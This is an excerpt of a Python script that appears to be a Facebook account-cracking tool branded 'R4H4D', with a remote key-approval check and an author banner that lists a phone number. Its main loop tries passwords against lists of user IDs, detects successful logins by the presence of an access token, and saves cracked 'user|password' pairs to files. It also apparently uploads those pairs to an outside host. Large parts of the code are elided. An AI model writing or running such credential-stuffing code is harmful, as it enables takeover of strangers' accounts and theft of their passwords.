...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰RAHAD")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/manas-2063/approval/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝                                 
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Mohammad Rahad 
\033[1;91m [\033[1;94m✓\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Mohammad Rahad 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01762212402
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [R4H4D_OLD] : %s/%s -> \033[0;92m [ R4H4D-OK:%s ]- \033[0;91m[R4H4D-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[R4H4D-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [R4H4D-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[R4H4D-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [R4H4D-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
